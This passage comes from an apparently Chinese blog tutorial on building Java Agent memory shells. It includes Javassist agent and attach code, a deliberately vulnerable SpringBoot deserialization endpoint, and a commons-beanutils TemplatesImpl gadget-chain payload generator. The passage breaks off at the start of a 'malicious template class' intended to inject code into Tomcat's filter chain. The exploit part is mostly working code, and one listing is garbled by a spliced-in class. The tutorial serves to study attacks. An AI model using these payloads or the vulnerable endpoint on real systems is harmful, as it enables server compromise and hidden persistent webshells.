class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.example.Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TestTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    inst.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.example.Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;System.out.println(\&quot;Attach Successful!\&quot;);&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  打成jar包：</p><p><a href="https://pic.imgdb.cn/item/64d26ff61ddac507cc0a6ded.jpg" title="image-20230804122643322" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26ff61ddac507cc0a6ded.jpg" alt="image-20230804122643322"></a></p><p><a href="https://pic.imgdb.cn/item/64d270031ddac507cc0a8fd2.jpg" title="image-20230804122657923" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270031ddac507cc0a8fd2.jpg" alt="image-20230804122657923"></a></p><p>之后我们写以下几个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hpackage</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;ello();</span><br><span class="line">        h1.Hello();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">            sc.nextInt();</span><br><span class="line">            <span class="type">Hello</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">            h2.Hello();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Attach</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">            System.out.println(toolsPath.toURI().toURL());</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.util.List&lt;Object&gt; list = (java.util.List&lt;Object&gt;) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                System.out.println(name);</span><br><span class="line">                <span class="keyword">if</span> (name.equals(<span class="string">&quot;org.example.HelloWorld&quot;</span>))&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/home/rainb0w/codes/java_projects/agent/out/artifacts/agent_jar/agent.jar&quot;</span>;</span><br><span class="line">                    loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tools.jar 不会在 JVM 启动的时候默认加载，这里通过URLClassLoader加载tools.jar。attach到org.example.HelloWorld，加载agent.jar更改Hello类的Hello方法，将<code>System.out.println(\&quot;Attach Successful!\&quot;);</code>插入到了Hello方法前面。</p><p>执行HelloWorld的main方法，输出了一次Hello World：</p><p><a href="https://pic.imgdb.cn/item/64d270101ddac507cc0ab183.jpg" title="image-20230804122327322" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270101ddac507cc0ab183.jpg" alt="image-20230804122327322"></a></p><p>执行Attach的main方法后，随意输入一个数，可以看到Hello类的Hello方法已经被改变：</p><p><a href="https://pic.imgdb.cn/item/64d2701c1ddac507cc0ad763.jpg" title="image-20230804123610992" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2701c1ddac507cc0ad763.jpg" alt="image-20230804123610992"></a></p><p>了解JavaAgent后，我们可以来打内存马了。还记得我们在Filter内存马那里的流程分析吗？在经过org.apache.catalina.core.ApplicationFilterFactory#createFilterChain后我们得到了一个ApplicationFilterChain对象，之后又调用了这个ApplicationFilterChain对象的doFilter函数，其中有request对象参数和response对象参数。因此我们可以更改ApplicationFilterChain类的doFilter函数，向它的前面添加一些恶意代码。</p><h4 id="反序列化注入-JavaAgent-型内存马"><a href="#反序列化注入-JavaAgent-型内存马" class="headerlink" title="反序列化注入 JavaAgent 型内存马"></a>反序列化注入 JavaAgent 型内存马</h4><p>首先创建一个简单的SpringBoot项目，并导入common-beanutils依赖，以下是一个示例controller：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo.controllers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializeController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/deserialize&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Vuln</span><span class="params">(<span class="meta">@RequestParam(required = false, name = &quot;bytecodes&quot;)</span> String encodedBytecodes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        System.out.println(encodedBytecodes);</span></span><br><span class="line">        <span class="keyword">if</span>(encodedBytecodes == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(encodedBytecodes);</span><br><span class="line">            <span class="type">byte</span>[] bytecodes = Base64.getDecoder().decode(encodedBytecodes);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytecodes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后给出生成payload的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(AgentTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意模板类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 